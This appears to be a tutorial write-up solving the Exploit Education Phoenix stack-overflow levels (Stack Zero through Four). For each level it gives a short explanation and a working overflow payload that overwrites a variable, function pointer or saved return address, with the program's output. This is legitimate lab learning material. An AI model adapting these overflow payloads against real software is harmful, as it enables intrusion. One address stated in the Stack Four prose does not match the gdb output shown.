# Stack overflow

There is multiple way of controlling the flow of a program, by overriding some part of the memory. In this section we will focus on stack memory overflow.

For those examples, you will need to install Phoenix: https://exploit.education/phoenix/getting-started/

## Stack Zero

### Exercise

Description: https://exploit.education/phoenix/stack-zero/

### Solution

`gets` function is not limited on the buffer size, causing possible overflow of variable that are stored in lower addresses.

The goal here is to send a content too fill the buffer, and override the `changeme` variable that is located next to the end of the `buffer` in the stack.

```
$ ./stack-zero 
Welcome to phoenix/stack-zero, brought to you by https://exploit.education
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
Well done, the 'changeme' variable has been changed!
```

## Stack One

### Exercise

Description: https://exploit.education/phoenix/stack-one/

### Solution

The solution is similar to the previous exercise, but we have to control what value we assign the variable `changeme` to.

```
$ ./stack-one HELLO
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Getting closer! changeme is currently 0x00000000, we want 0x496c5962

$ ./stack-one `python -c 'print ("A"*64)+"\x62\x59\x6c\x49" '`
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Well done, you have successfully set changeme to the correct value
```

## Stack Two

### Exercise

Description: https://exploit.education/phoenix/stack-two/

### Solution

The solution is similar to the previous exercise, but we have to control what value we assign the variable `changeme` to (using an environment variable).

```
$ ExploitEducation=HELLO ./stack-two
Welcome to phoenix/stack-two, brought to you by https://exploit.education
Almost! changeme is currently 0x00000000, we want 0x0d0a090a

$ ExploitEducation=`python -c 'print ("A"*64)+"\x0a\x09\x0a\x0d"'` ./stack-two
Welcome to phoenix/stack-two, brought to you by https://exploit.education
Well done, you have successfully set changeme to the correct value
```

## Stack Three

### Exercise

Description: https://exploit.education/phoenix/stack-three/

### Solution

The solution is similar to the previous exercise, but we have to control the address the function pointer `fp` will call.

We will assign it to the `complete_level` function (located at 0x0040069d)

```
$ gdb ./stack-three
(gdb) info functions 
…
0x000000000040069d  complete_level
0x00000000004006b5  main
…

$ python -c 'print ("A"*64)+"\x9d\x06\x40" ' | ./stack-three 
Welcome to phoenix/stack-three, brought to you by https://exploit.education
calling function pointer @ 0x40069d
Congratulations, you've finished phoenix/stack-three :-) Well done!
```

## Stack Four

### Exercise

Description: https://exploit.education/phoenix/stack-four/

### Solution

The solution is similar to the previous exercise, but we have to control the control flow by overriding the `rip` address after returning from the main function.

This address is stored at the begging of the stack frame. (See CPU / Stack for more information)

We will assign it to the `complete_level` function (located at 0x0040069d)

```
$ gdb ./stack-four 
(gdb) info functions 
...
0x000000000040061d  complete_level
0x0000000000400635  start_level
…

$ python -c 'print ("A"*88)+"\x1d\x06\x40\x00\x00\x00\x00\x00" ' | ./stack-four
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x40061d
Congratulations, you've finished phoenix/stack-four :-) Well done!
```
